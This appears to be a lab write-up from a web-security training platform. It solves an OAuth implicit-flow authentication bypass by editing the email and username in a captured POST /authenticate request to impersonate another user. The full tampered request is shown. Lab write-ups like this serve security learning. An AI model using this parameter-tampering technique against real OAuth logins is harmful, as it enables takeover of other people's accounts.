---
tags:
  - oauth
  - api
  - authn
---
# Authentication bypass via OAuth implicit flow

## Instructions

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Solution

Modify the username and email in the `POST` request to `/authenticate`

```
POST /authenticate HTTP/1.1
Host: 0ae100e804de9d51806253d500b20088.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0ae100e804de9d51806253d500b20088.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0ae100e804de9d51806253d500b20088.web-security-academy.net
Connection: keep-alive
Cookie: session=2MoMxo3aB2R8xyTmpqAOfph7jty6O6tf
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue
Priority: u=4

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"sLoZuWYvMzvhXrCwtZEMyJnRCeTSntVbCf24pVJv782"}
```

## Lesson Learned

This works because the data that's sent in the POST request is implicitly trusted (Implicit Flow). So when this is sent, the server sets a session cookie.